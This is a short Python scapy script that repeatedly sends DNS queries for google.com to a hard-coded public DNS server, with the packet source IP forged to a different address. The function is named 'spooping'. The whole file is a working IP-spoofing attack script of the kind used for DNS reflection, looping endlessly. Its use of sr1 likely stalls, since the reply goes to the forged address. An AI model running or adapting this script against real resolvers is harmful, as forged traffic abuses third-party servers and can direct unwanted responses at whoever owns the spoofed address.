from scapy.all import DNS, DNSQR, IP, UDP, send, sr1
import time

str_server = "192.168.123.109"
dns_server = "219.251.176.190"
domain = "google.com"

def spooping():
    dns_query = DNS(rd=1, qd=DNSQR(qname=domain))
    udp = UDP(dport=53, sport=80)
    ip = IP(src=str_server, dst=dns_server)
    packet = ip/udp/dns_query
    return packet

def send_dns_query(packet):
    # send(packet, verbose=0)
    response = sr1(packet)
    return response

while True:
    packet = spooping()
    response = send_dns_query(packet)
    print(response)
    time.sleep(1)